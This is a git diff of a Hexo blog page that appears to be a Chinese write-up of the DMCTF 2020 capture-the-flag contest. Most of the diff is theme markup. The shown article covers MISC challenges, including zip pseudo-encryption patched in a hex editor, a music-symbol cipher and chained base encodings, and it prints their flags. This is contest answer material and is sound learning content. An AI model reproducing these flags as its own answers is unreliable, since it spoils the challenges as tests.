@@ -1,552 +1,1978 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
 <head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta charset="utf-8">
+    <meta name="keywords" content="DMCTF WriteUp, 技术">
+    <meta name="description" content="一个简简单单的博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>DMCTF WriteUp | 会飞的鱼的Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="会飞的鱼的Blog" type="application/atom+xml">
+</head>
 
 
 
-<title>
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">会飞的鱼的Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
   
-    DMCTF WriteUp
-  
-</title>
-
-<meta name="description" content="MISCCheck Indmctf{Welcome_to_dmctf2020} 签到题 fakezipzip伪加密 WinHex打开，修改加密位  修改为00 00，保存  解压出来，是一个flag.txt 音乐符号加密 文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn)  flag{da1ada1a} Base familyXUZbB{fp}U)&#x3D;ql[n%GCbk9">
-<meta property="og:type" content="article">
-<meta property="og:title" content="DMCTF WriteUp">
-<meta property="og:url" content="http://example.com/2020/11/28/DMCTF-WriteUp/index.html">
-<meta property="og:site_name" content="会飞的鱼的Blog">
-<meta property="og:description" content="MISCCheck Indmctf{Welcome_to_dmctf2020} 签到题 fakezipzip伪加密 WinHex打开，修改加密位  修改为00 00，保存  解压出来，是一个flag.txt 音乐符号加密 文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn)  flag{da1ada1a} Base familyXUZbB{fp}U)&#x3D;ql[n%GCbk9">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231732236.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231807913.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211132655.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211208097.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211237142.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211255379.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211311550.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128104036120.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128105301975.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112731115.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128112815875.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180130844.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180242480.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180304253.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180337119.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128180449828.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212207906.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212404922.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212719773.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201212823509.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181028337.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128181552152.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128182140609.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128182054222.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128183314882.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128185910688.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191119983.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191710927.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191655160.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191538682.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128191749702.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192150442.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192342062.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192402961.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192932243.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128192951386.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193113033.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193235290.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213113170.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213335829.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201213521455.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214323874.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201214552082.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201230355729.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193607663.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128193633813.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194118981.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128194330674.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128195851478.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200303919.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128200456659.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202742202.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202805990.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128202949377.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128203423490.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204338956.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128204257324.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128210929160.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211013711.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211142021.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211344457.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128211910024.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212255102.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212429907.png">
-<meta property="og:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201128212532930.png">
-<meta property="article:published_time" content="2020-11-28T03:22:55.000Z">
-<meta property="article:modified_time" content="2021-01-05T03:27:49.625Z">
-<meta property="article:author" content="武英强">
-<meta property="article:tag" content="CTF WriteUp">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231732236.png">
-
-
-  <link rel="alternative" href="/atom.xml" title="会飞的鱼的Blog" type="application/atom+xml">
-
-
-
-  <link rel="icon" href="/favicon.png">
-
-
-
-<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
-
-
-<link rel="stylesheet" href="/styles/main.css">
-
-
-
-
-
-
-
-<meta name="generator" content="Hexo 5.4.0"></head>
-<body
-  
-    class="monochrome"
-  
-  >
-  <div class="mobile-header">
-  <button class="sidebar-toggle" type="button">
-    <span class="icon-bar"></span>
-    <span class="icon-bar"></span>
-    <span class="icon-bar"></span>
-  </button>
-  <a class="title" href="/">会飞的鱼的Blog</a>
-</div>
-
-  <div class="main-container">
-    <div class="sidebar">
-  <div class="header">
-    <h1 class="title"><a href="/">会飞的鱼的Blog</a></h1>
+  <li class="hide-on-med-and-down nav-item">
     
-    <div class="info">
-      <div class="content">
-        
-          <div class="description">一个简简单单的博客</div>
-        
-        
-          <div class="author">武英强</div>
-        
-      </div>
+    <a href="/" class="waves-effect waves-light">
       
-        <div class="avatar">
-          
-            <a href="/about"><img src="https://cn.gravatar.com/avatar/35fef74d731255cd569c2c2b0b9e87e4?s=200"></a>
-          
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">会飞的鱼的Blog</div>
+        <div class="logo-desc">
+            
+            一个简简单单的博客
+            
         </div>
-      
     </div>
-  </div>
-  <div class="body">
+
     
-      
-        <ul class="nav">
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
           
-            
-              <li class="category-list-container">
-                <a href="javascript:;">分类</a>
-                
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
           
-            
-              <li class="tag-list-container">
-                <a href="javascript:;">标签</a>
-                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUP/" rel="tag">CTF WriteUP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-WriteUp/" rel="tag">CTF WriteUp</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag">技术</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a><span class="tag-list-count">1</span></li></ul>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
           
-            
-              <li class="archive-list-container">
-                <a href="javascript:;">归档</a>
-                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">1</span></li></ul>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
           
-        </ul>
-      
-        <ul class="nav">
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
           
-            
-              <li>
-                <a href="/" title="Homepage" external="false">Homepage</a>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
           
-            
-              <li>
-                <a href="/archives" title="By Year" external="false">By Year</a>
-              </li>
-            
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
           
-        </ul>
-      
-        <ul class="nav">
-          
-            
-              <li>
-                <a href="https://github.com/denjones/hexo-theme-chan" title="Chan" target="_blank" rel="noopener">Chan</a>
-              </li>
-            
-          
-            
-              <li>
-                <a href="https://github.com/denjones" title="Github" target="_blank" rel="noopener">Github</a>
-              </li>
-            
-          
-            
-              <li>
-                <a href="/atom.xml" title="RSS" external="false">RSS</a>
-              </li>
-            
-          
-        </ul>
-      
-    
-  </div>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/flyingfish20201" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
 </div>
 
-    <div class="main-content">
-      
-        <div style="max-width: 1000px">
-      
-          <article id="post-DMCTF-WriteUp" class="article article-type-post">
-  
-    <h1 class="article-header">
-      DMCTF WriteUp
-    </h1>
-  
-  
 
-  <div class="article-info">
-    <span class="article-date">
-  2020-11-28
-</span>
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/flyingfish20201" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
 
     
 
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">DMCTF WriteUp</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
     
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF-WriteUp/" rel="tag">CTF WriteUp</a></li></ul>
-	</span>
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
 
+    #articleContent :focus {
+        outline: none;
+    }
 
-  </div>
-  <div class="article-entry">
-    <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a>Check In</h4><p>dmctf{Welcome_to_dmctf2020}</p>
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/WriteUp/">
+                                <span class="chip bg-color">WriteUp</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2020-11-28
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.9k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a>Check In</h4><p>dmctf{Welcome_to_dmctf2020}</p>
 <p>签到题</p>
 <h4 id="fakezip"><a href="#fakezip" class="headerlink" title="fakezip"></a>fakezip</h4><p>zip伪加密</p>
 <p>WinHex打开，修改加密位</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231732236.png" alt="image-20201123231732236"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231732236.png" alt="image-20201123231732236" title="">
+                </div>
+                <div class="image-caption">image-20201123231732236</div>
+            </figure>
+
 <p>修改为00 00，保存</p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231807913.png" alt="image-20201123231807913"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231807913.png" alt="image-20201123231807913" title="">
+                </div>
+                <div class="image-caption">image-20201123231807913</div>
+            </figure>
+
 <p>解压出来，是一个flag.txt</p>
 <p>音乐符号加密</p>
 <p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211132655.png" alt="image-20201201211132655"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211132655.png" alt="image-20201201211132655" title="">
+                </div>
+                <div class="image-caption">image-20201201211132655</div>
+            </figure>
+
 <p>flag{da1ada1a}</p>
 <h4 id="Base-family"><a href="#Base-family" class="headerlink" title="Base family"></a>Base family</h4><p>XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td”^w$Q8+8T])e.llK?<em>z<code>gS:+C]llUG:z1=ekEN&#125;8DmJf&amp;GP&lt;Rk:o_Jk&lt;J.zp8%H0g7sYSTJ9p.&quot;duRBGj</code>g0!I+xjm(fh)]IF:&gt;omN8=m+Xp(X0:U</em>8Sj5|8p.<em>o[i0:%.qu}%</em>=&lt;D</p>
 <p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/base91.html">CTF在线工具-在线base91编码|在线base91解码|base91编码|base91解码 (ssleye.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211208097.png" alt="image-20201201211208097"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211208097.png" alt="image-20201201211208097" title="">
+                </div>
+                <div class="image-caption">image-20201201211208097</div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/base58w.html">CTF在线工具-在线base58编码|在线base58解码|base58编码|base58解码|base58check (ssleye.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211237142.png" alt="image-20201201211237142"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211237142.png" alt="image-20201201211237142" title="">
+                </div>
+                <div class="image-caption">image-20201201211237142</div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/base64.html">CTF在线工具-在线base编码|在线base解码|base16编码|base32编码|base64编码 (ssleye.com)</a></p>
-<p><img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211255379.png" alt="image-20201201211255379"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://flyingfish-picture.oss-cn-beijing.aliyuncs.com/img/image-20201201211255379.png" alt="image-20201201211255379" title="">
+                </div>
+                <div class="image-caption">image-20201201211255379</div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q&#x3D;</span><br></pre></td></tr></table></figure>
 
